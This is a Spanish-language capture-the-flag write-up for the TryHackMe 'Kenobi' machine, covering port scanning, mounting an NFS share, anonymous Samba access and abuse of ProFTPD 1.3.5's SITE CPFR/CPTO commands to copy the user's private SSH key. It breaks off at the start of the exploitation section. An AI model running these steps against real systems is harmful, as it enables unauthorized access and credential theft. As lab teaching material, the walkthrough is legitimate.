---
title: Kenobi
description: Write Up de Kenobi TryHackMe
published: true
date: 2025-05-12T14:54:50.266Z
tags: write up
editor: markdown
dateCreated: 2025-05-06T15:51:34.674Z
---

# Kenobi
Bienvenido a la máquina Kenobi, hecha en GitHub.

## Exploración
Lo primero que vamos a hacer es un escaneo de puertos para saber que servicios tiene disponibles.
10.10.218.69
```
nmap -sT -Pn -sV {IP}
```

IMAGEN 1

Como podemos observar tenemos:
- Un servicio FTP
- Un servicio SSH
- Un servicio HTTP
- Servicio de Samba
- Puero 2049

Lo más interesante que podemos observar, es la página web, el servidor ftp y el puerto 2049. Teniendo el puerto 2049, con un NFS, podemos intentar montar el disco que hay disponible.

Para ello deberemos saber que puerto hay disponible, eso lo hacemos mediante:
```
showmount -e {IP}
```

Una vez que vamos a importar, creamos una carpeta similar y lo montamos:
```
mkdir -p tmp/var
sudo mount -t nfs {IP}:/var tmp/var
```

IMAGEN 2

Ahora entramos en la carpeta y listamos lo que hay

IMAGEN 3


Investigaremos esto en profundidad mas adelante, vamos a intentar conectarnos como anonymous en el servidor FTP

IMAGEN 4

Sin embargo, podemos observar que no hemos puesto la credecial correcta. 

Vamos a investigar con respecto a la página web.

IMAGEN 5

Solo tenemos una imagen, por lo que investigaremos el último servicio que nos queda que es samba.

Vamos a ejecutar el siguiente comando:
```
smbclient -L //{IP} -N
```

Con este comando vamos a ejecutar una lectura principal de usuarios y servicios activos, donde podemos ver que hay una cuenta llamada anonymous 

IMAGEN 6

Ahora vamos a intentar conectarnos como ese usuario:
```
smbclient //{IP}/anonymous
```
Nos pedirá una contraseña, sin embargo está vez si que nos permite el acceso con las credenciales predeterminadas (anonymous/anonymous).

Haremos una lectura de los archivos con un ls, y nos descargaremos el fichero que haya.

```
ls
get log.txt
```

IMAGEN 7

Una vez descargado, vamos a leer el log, que parece ser todos los logs, tanto de samba, como de FTP y SSH.

IMAGEN 8

De este archivo no tenemos mucha mas información importante, sin embargo podriamos intentar hacer un exploit de ftp, ya que sabemos que usa proftpd y con el escaneo de nmap, podemos descubirr que es versión 1.3.5

IMAGEN 9

Ahora vamos a hacer lo siguiente
```
nc {IP} 21
```

Con esto nos conectamos al seridor FTP, sin embargo por esta versión hay una vulnerabilidad de copia de archivos sin estar verificado, por lo que podemos continuar con:
```
site CPFR /home/kenobi/.ssh/id_rsa
site CPTO {lugar donde dejamos el archiv}
```

IMAGEN 10

> Tener en cuenta el directorio donde estamos
{.is-warning}


Debido a que ya tenemos el rsa, podemos conectarnos.

## Explotación

Copiaremos el archivo 